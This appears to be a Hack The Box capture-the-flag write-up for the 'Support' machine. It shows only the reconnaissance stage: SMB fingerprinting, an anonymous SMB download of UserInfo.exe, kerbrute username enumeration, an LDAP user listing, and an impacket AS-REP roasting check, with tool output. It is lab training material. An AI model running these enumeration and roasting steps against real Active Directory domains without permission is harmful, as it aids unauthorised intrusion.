---
layout: post
title: HTB Machine - Support
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png
share-img: https://www.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png
tags: [ HTB, Hack the Box,Network,Vulnerability Assessment,Forensics,Databases,Common Services,Application,Reversing,Traffic,LDAP,WinRM,Custom,SMB,.NET,C#,.NET,Reconnaissance,User Enumeration,Privilege Abuse,Packet Capture Analysis,Information Disclosure,Weak Cryptography,Hard-coded Credentials,LDAP Injection,Active Directory,Misconfiguration]
---

SMB is open so we are going to check and find an interesting executable in one of the folders. 
```zsh
crackmapexec smb 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)

smbmap -H 10.10.11.174 -u 'null' --download support-tools/UserInfo.exe.zip

file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

cat UserInfo.exe.config -l xml

strings UserInfo.exe -e l

/opt/kerbrute/kerbrute userenum -d support.htb --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

UserInfo.exe find -first * -last *
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria

impacket-GetNPUsers -no-pass -usersfile users support.htb/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User support doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User raven.clifton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User anderson.damian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User monroe.david doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cromwell.gerard doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User west.laura doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User levine.leopoldo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User langley.lucy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User daughtler.mabel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bardot.mary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stoll.rachelle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User thomas.raphael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smith.rosario doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wilson.shelby doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hernandez.stanley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ford.victoria doesn't have UF_DONT_REQUIRE_PREAUTH set
```
